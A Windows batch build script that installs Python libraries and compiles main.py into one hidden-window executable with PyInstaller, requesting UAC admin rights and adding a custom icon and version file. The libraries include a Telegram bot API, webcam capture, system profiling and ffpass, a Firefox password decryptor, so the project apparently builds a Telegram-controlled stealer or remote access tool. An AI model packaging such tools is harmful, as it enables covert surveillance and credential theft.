@echo off

pip install --upgrade pip
pip install pyinstaller
pip install requests
pip install pywin32
pip install opencv-python
pip install Pillow
pip install pyTelegramBotAPI
pip install psutil
pip install GPUtil
pip install tabulate
pip install pycryptodome
pip install configparser
pip install ffpass
pyinstaller --uac-admin --noconfirm --onefile --windowed --icon "icon.ico" --version-file "version.py" --add-data "modules;modules/"  "main.py"

rmdir /s /q build

:cmd
pause null